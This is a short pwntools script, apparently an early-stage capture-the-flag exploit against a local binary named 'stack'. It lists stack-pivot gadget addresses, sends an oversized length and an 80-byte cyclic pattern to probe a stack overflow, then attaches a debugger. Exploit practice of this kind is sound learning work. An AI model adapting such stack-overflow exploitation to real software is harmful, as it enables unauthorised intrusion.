from pwn import *

elf = ELF('./stack')
p = process('./stack')
context(arch="amd64", log_level="debug")

def debug():
    gdb.attach(p)
    pause()

ret = 0x000000000040101a
pop_rbp_ret = 0x00000000004011bd
leave_ret = 0x00000000004012e4
size = b'1000'

p.recvuntil(b"size: ")
p.sendline(size)
pay = cyclic(80)
p.send(pay)
debug()
p.interactive()

